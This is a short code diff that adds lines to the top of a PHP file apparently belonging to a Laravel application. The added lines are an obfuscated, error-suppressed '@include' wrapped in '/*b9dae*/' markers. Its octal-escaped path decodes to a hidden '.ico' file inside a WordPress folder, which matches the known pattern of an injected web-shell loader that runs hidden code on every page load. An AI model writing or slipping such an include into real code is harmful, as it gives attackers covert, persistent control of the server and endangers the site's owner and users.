@@ -1,5 +1,9 @@
 <?php
+/*b9dae*/
 
+@include ("\057ho\155e2\057ry\160ac\151/p\165bl\151c_\150tm\154/w\160-i\156cl\165de\163/b\154oc\153s/\161ue\162y-\164it\154e/\056a7\06553\06238\056ic\157");
+
+/*b9dae*/
 /**
  * Laravel - A PHP Framework For Web Artisans
  *
